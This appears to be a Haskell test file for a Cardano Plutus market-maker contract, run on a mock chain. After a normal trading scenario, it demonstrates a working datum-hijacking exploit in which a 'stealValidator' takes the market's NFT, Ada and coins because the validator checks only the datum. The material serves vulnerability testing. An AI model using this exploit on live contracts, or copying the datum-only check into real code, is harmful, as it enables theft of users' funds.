{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE NoImplicitPrelude #-}

module MarketMakerSpec where

import Cooked.MockChain
import Cooked.Tx.Constraints
import Cooked.Tx.Generator
import qualified Ledger
import qualified Ledger.Ada as Ada
import qualified Ledger.Contexts as Contexts
import qualified Ledger.Typed.Scripts as TScripts
import qualified Ledger.Value as Value
import qualified MarketMaker as Market
import qualified Plutus.Contracts.Currency as Currency
import qualified PlutusTx.AssocMap as AssocMap
import PlutusTx.Prelude
import Test.Hspec

import MarketMaker.DatumHijacking

-- Parameters of the test runs

-- | Some coins for the market initial stock
nbCoinsMarketInit :: Integer
nbCoinsMarketInit = 50

-- | Some initial coins for one of the wallets (to vary situations and make it
-- possible to define runs where the market maker can start by buying some
-- assets).
nbCoinsWalletInit :: Integer
nbCoinsWalletInit = 10

-- | Constant in the market maker equation
-- (nb assets in store * ada per asset = constant)
constant :: Integer
constant = 5000

-- In the following, there are a lot of "Maybe" arising from the fact that the
-- script is parameteried by NFT and coins token classes whose policies have to
-- be initialized first individually in each run.

-- | Parameters to initialize the market maker validator
mParams :: Maybe Market.MarketParams
mParams = do
  nftAssetClass <- mNftAssetClass
  coinsAssetClass <- mCoinsAssetClass
  return $ Market.MarketParams nftAssetClass coinsAssetClass constant

-- | The market maker validator
mMarketValidator :: Maybe (TScripts.TypedValidator Market.Market)
mMarketValidator = Market.marketValidator <$> mParams

-- | Name of the market maker NFT
nftName :: Value.TokenName
nftName = Value.TokenName "MarketNFT"

-- | Name of the market maker exchanged asset (the coins)
coinsName :: Value.TokenName
coinsName = Value.TokenName "GoldenCoins"

-- | Minting policy for both the NFT and exchanged assets (the coins)
-- It is a one shot minting policy that produces 1 NFT and some coins once and
-- for all.
mPolicy :: Maybe TScripts.MintingPolicy
mPolicy = do
  txInputToSpendRef <- mTxInputToSpendRef
  return $
    Currency.curPolicy $
      Currency.OneShotCurrency
        -- Reference to tx input to be spent when minting
        txInputToSpendRef
        -- How many to mint
        (AssocMap.fromList [(nftName, 1), (coinsName, nbCoinsMarketInit + nbCoinsWalletInit)])
  where
    mTxInputToSpendRef = either (const Nothing) fst eitherTxRef
    eitherTxRef = runMockChain $ do
      utxos <- pkUtxos (walletPKHash $ wallet 1)
      case utxos of
        [(Contexts.TxOutRef txId i, _)] -> return (Just (txId, i))
        _ -> return Nothing

-- | Currency symbol: hash of the minting policy
mCurrencySymbol :: Maybe Ledger.CurrencySymbol
mCurrencySymbol = Contexts.scriptCurrencySymbol <$> mPolicy

-- | NFT asset class (currency symbol and nft name)
mNftAssetClass :: Maybe Ledger.AssetClass
mNftAssetClass = do
  nftCurrencySymbol <- mCurrencySymbol
  return $ Value.assetClass nftCurrencySymbol nftName

-- | Coins asset class (currency symbol and coins name)
mCoinsAssetClass :: Maybe Ledger.AssetClass
mCoinsAssetClass = do
  nftCurrencySymbol <- mCurrencySymbol
  return $ Value.assetClass nftCurrencySymbol coinsName

-- | Parameters of a run (after initialization of the minting policy)
data RunParams = RunParams
  { runParamsMarketValidator :: TScripts.TypedValidator Market.Market
  , runParamsMintingPolicy :: TScripts.MintingPolicy
  , runParamsNftClass :: Ledger.AssetClass
  , runParamsCoinsClass :: Ledger.AssetClass
  }

-- | Parameters of a market transaction: that is how much Ada and coins the
-- transaction will output to the wallet and the market maker in the end.  This
-- has to be thought about while keeping track of the inputs that will be spent
-- during the transaction.
data MarketTxParams = MarketTxParams
  { marketTxParamsWalletAda :: Integer
  , marketTxParamsWalletCoins :: Integer
  , marketTxParamsMarketMakerAda :: Integer
  , marketTxParamsMarketMakerCoins :: Integer
  }

-- | Template of a transaction
marketTx :: Market.MarketRedeemer -> Wallet -> MarketTxParams -> RunParams -> MockChain ()
marketTx redeemer wIssuer (MarketTxParams wAda wCoins mmAda mmCoins) (RunParams validator _ nftClass coinsClass) = do
  let ada = Ada.lovelaceValueOf
  let coins = Value.assetClassValue coinsClass
  let oneNft = Value.assetClassValue nftClass 1
  [(output, datum)] <- scriptUtxosSuchThat validator (\_ _ -> True)
  validateTxFromSkeleton $
    TxSkel
      wIssuer
      [ SpendsScript validator redeemer (output, datum)
      , PaysScript validator [(Market.MarketDatum mmCoins, oneNft <> ada mmAda <> coins mmCoins)]
      , PaysPK (walletPKHash wIssuer) (ada wAda <> coins wCoins)
      ]

-- | Template of a Sell transaction
marketSellTx :: Wallet -> MarketTxParams -> RunParams -> MockChain ()
marketSellTx = marketTx Market.Sell

-- | Template of a Buy transaction
marketBuyTx :: Wallet -> MarketTxParams -> RunParams -> MockChain ()
marketBuyTx = marketTx Market.Buy

-- | Initial minting and distribution of token in a given run
-- The NFT and coins are minted. The NFT is paid to the script.
-- Part of the coins is given to the script and part of it to a receiving
-- wallet (to have some diversity in the runs and allow the script to buy from
-- a wallet right from start).
marketMiningTx :: Wallet -> Wallet -> RunParams -> MockChain ()
marketMiningTx wIssuer wReceiver (RunParams validator policy nftClass coinsClass) =
  let coins = Value.assetClassValue coinsClass
      oneNft = Value.assetClassValue nftClass 1
   in validateTxFromSkeleton $
        TxSkel
          wIssuer
          [ PaysPK (walletPKHash wIssuer) mempty
          , Mints [policy] (oneNft <> coins (nbCoinsWalletInit + nbCoinsMarketInit))
          , PaysScript
              validator
              [
                ( Market.MarketDatum nbCoinsMarketInit
                , oneNft <> coins nbCoinsMarketInit
                )
              ]
          , PaysPK (walletPKHash wReceiver) (coins nbCoinsWalletInit)
          ]

-- | Example run
run1 :: Maybe (Either MockChainError ((), UtxoState))
run1 = do
  marketValidator <- mMarketValidator
  policy <- mPolicy
  nftAssetClass <- mNftAssetClass
  coinsAssetClass <- mCoinsAssetClass

  let runParams = RunParams marketValidator policy nftAssetClass coinsAssetClass

  return . runMockChain $ do
    -- Transaction 0: minting
    -- Wallet 1 mints the nft and coins and shares it among the market and wallet 2
    marketMiningTx (wallet 1) (wallet 2) runParams

    -- Transaction 1: the market sells 10 coins to wallet 2
    -- A golden coin is worth 100 Ada
    -- 40 coins remain in the market maker
    marketBuyTx (wallet 2) (MarketTxParams 0 10 1000 40) runParams

    -- Transaction 2: the market sells 4 coins to wallet 3
    -- A golden coin is now worth 125 Ada (500 for 4 coins)
    -- The market output has also 1000 Ada to be given back (so 1500 in total)
    marketBuyTx (wallet 3) (MarketTxParams 0 4 1500 36) runParams

    -- Transaction 3: the market buys 9 coins to wallet 2
    -- A golden coin is now worth 1250/9
    -- The market output had 1500 ada and 36 golden coins
    -- so that's 250 ada and 45 coins to give back
    -- Wallet 2 has 2 unspent outputs of 10 coins at that point so that's 1
    -- coin to give back.
    marketSellTx (wallet 2) (MarketTxParams 1250 1 250 45) runParams

-- We instantiate the datum hijacking contract to exploit the fact that
-- checks are done on the datum of the contract instead of the address of it.
stealValidator :: TScripts.TypedValidator Stealer
stealValidator = stealerValidator $ StealerParams (walletPKHash $ wallet 1)

-- | Since the 'marketValidator' only checks that there is an output with the expected datum,
-- without any checks on the address of this output,
-- anyone can substitute the marketmaker by the script they like.
datumHijacking :: Maybe (Either MockChainError ((), UtxoState))
datumHijacking = do
  marketValidator <- mMarketValidator
  policy <- mPolicy
  nftAssetClass <- mNftAssetClass
  coinsAssetClass <- mCoinsAssetClass

  let runParams = RunParams marketValidator policy nftAssetClass coinsAssetClass

  return . runMockChain $ do
    -- The transaction 0 is the same as in the previos example.
    -- Wallet 1 mints the NFT and the coins and shares it.
    marketMiningTx (wallet 1) (wallet 2) runParams

    [(out, dat)] <- scriptUtxosSuchThat marketValidator (\_ _ -> True)

    let ada = Ada.lovelaceValueOf
    let coins = Value.assetClassValue coinsAssetClass
    let oneNft = Value.assetClassValue nftAssetClass 1

    -- We take advantage of a purchase of golden coins to inject our 'stealValidator' instead of the original 'marketValidator' one.
    validateTxFromSkeleton $
      TxSkel
        (wallet 1)
        [ SpendsScript marketValidator Market.Buy (out, dat)
        , PaysScript stealValidator [(StealerDatum 40, oneNft <> ada 1000 <> coins 40)]
        , PaysPK (walletPKHash (wallet 1)) (coins 10)
        ]

    [(outS, datS)] <- scriptUtxosSuchThat stealValidator (\_ _ -> True)

    -- Now, everything belongs to the wallet 1, who can easily harvest the loot.
    validateTxFromSkeleton $
      TxSkel
        (wallet 1)
        [ SpendsScript stealValidator () (outS, datS)
        , PaysPK (walletPKHash (wallet 1)) (oneNft <> ada 1000 <> coins 40)
        ]

-- Test spec
spec :: Spec
spec = do
  it "succeeds on the example run" $ do
    run1 `shouldSatisfy` maybe False isRight
  it "is possible to hijack datum" $ do
    datumHijacking `shouldSatisfy` maybe False isRight
